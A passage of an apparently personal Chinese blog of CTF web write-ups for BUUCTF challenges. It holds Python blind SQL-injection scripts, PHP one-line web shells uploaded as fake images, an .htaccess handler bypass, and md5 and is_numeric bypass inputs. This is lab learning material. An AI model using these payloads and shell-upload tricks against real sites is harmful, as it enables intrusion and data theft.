class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Origin</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://cb3e0494-<span class="hljs-number">3</span>cbe-<span class="hljs-number">4</span>dca-b625-ed7bbc363bbe.node5.buuoj.cn:<span class="hljs-number">81</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后就是对id进行注入了,<br>用bp fuzz一下,大概过滤了</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">空格<br>or<br><span class="hljs-string">||</span><br>and<br><span class="hljs-meta">&amp;&amp;</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-punctuation">;</span><br>&#x27;xmlupdate()<br>/**/<br>`<br></code></pre></td></tr></table></figure><p>试出如下</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">1^(length(database())=2)<br><br>若是length是对的会返回：<br><span class="hljs-keyword">Error </span>Occured When Fetch Result.<br><br>否则返回：<br>Hello, glzjin wants a girlfriend.<br></code></pre></td></tr></table></figure><p>由此可以对进行盲注<br>先用bp已经测试出数据库长度为11；<br>找个脚本改改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://69638964-21bc-445d-a323-6de57b0ff6bb.node5.buuoj.cn:81/&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">10</span>,<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.2</span>) <br>        payload = <span class="hljs-string">&#x27;1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing 数据库名称第:&quot;</span>,i,<span class="hljs-string">&quot;第个&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&quot;字符&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名称：&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br><br></code></pre></td></tr></table></figure><p>先跑出数据库名：<br>ctftraining<br>然后题目给了表明和列明，那直接爆flag就行，那我跑库名干什么？<br>就当测试吧  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://b74d121d-ae37-46c5-9e40-49750c875c6b.node5.buuoj.cn:81/index.php&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> le <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload= <span class="hljs-string">&#x27;1^((length((select(flag)from(flag))))&lt;&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(le)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;测试flag长度中:&quot;</span>,le)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag长度为:&quot;</span>,le)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,le+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">117</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        payload = <span class="hljs-string">&#x27;1^((ascii(substr((select(flag)from(flag)),&#123;&#125;,1)))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag名称第:&quot;</span>,i,<span class="hljs-string">&quot;个字符&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&#x27;    &#x27;</span>,flag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>,flag)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br></code></pre></td></tr></table></figure><p>可能是我昨晚做迷糊了，卡在length和substr里面用select需要再加一层括号里，卡了一个半小时，到凌晨3点半，<br>一道题做了三个半小时，道心破碎了；<br>至少最后独立做出来了；<br>flag{e53ac9ec-ab18-44e9-89b4-f1b39d8f813c}</p><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>先传个🐎看看：  </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">传php木马：<br>回显：后缀名不能有ph！<br><br>传正常png文件：<br>上传类型也太露骨了吧！<br><br>传<span class="hljs-keyword">jpg看看：</span><br><span class="hljs-keyword"></span>上传类型也太露骨了吧！<br></code></pre></td></tr></table></figure><p>不管了，bp抓包改  </p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;uploaded&quot;</span>; filename=<span class="hljs-string">&quot;shell.jpeg&quot;</span><br>Content-Type: image/jpeg<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[zhong]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>成功：<br>/var/www/html/upload/<span class="hljs-number">407</span>deea951641fdc86613277efecd816/shell.jpeg succesfully uploaded!<br></code></pre></td></tr></table></figure><p>在浏览器上访问成功，但是用蚂蚁连接不上，应该也是没目录没php解析的问题，<br>观察到服务器端为apache<br>那应该就是尝试.htaccess</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;.htaccess&quot;</span><br><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/jpeg</span><br><br>SetHandler application<span class="hljs-symbol">/x-httpd-php</span><br><br><span class="hljs-symbol">/var/www/html/upload/407deea951641fdc86613277efecd816/.htaccess</span> succesfully uploaded<span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure><p>蚂蚁连接成功，在根目录找到flag<br>本来看到这串路径我还以为是随机目录之类的    </p><p>乘机试了一下，想在.htaccess文件中直接添加木马，结果连不上，可能是不行吧<br>在upload目录下搞得，还把环境搞坏了</p><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123; <span class="hljs-comment">//md5绕过，要求两个值不相等但是计算的md5相等，</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;  <br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure><p>第一先试一下数组绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>You got the first steponly one way to get the flag<br></code></pre></td></tr></table></figure><p>然后添加post数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>passwd=<span class="hljs-number">1234567</span><br><br>You got the first stepYou can not get it !<br></code></pre></td></tr></table></figure><p>要对is_numeric进行绕过，源码里的：<br>if (!is_numeric($passwd))<br>是不能是纯数字意思<br>那passwd&#x3D;1234567aa，<br>拿到flag，  </p><h2 id="php比较绕过-is-numeric"><a href="#php比较绕过-is-numeric" class="headerlink" title="php比较绕过 is_numeric()"></a>php比较绕过 is_numeric()</h2><p>因为php对字符串类型与整数类型进行&#x3D;&#x3D;比较时会把字符串转化为整型数据，<br>此时<br>1234567aa 就会变为 1234567<br>实现比较</p><hr><h2 id="title-note-33date-2025-05-07-13-05-02tags-web"><a href="#title-note-33date-2025-05-07-13-05-02tags-web" class="headerlink" title="title: note-33date: 2025-05-07 13:05:02tags: web"></a>title: note-33<br>date: 2025-05-07 13:05:02<br>tags: web</h2><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传正常图片提示里面有&lt;?不给传，传码看看：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span 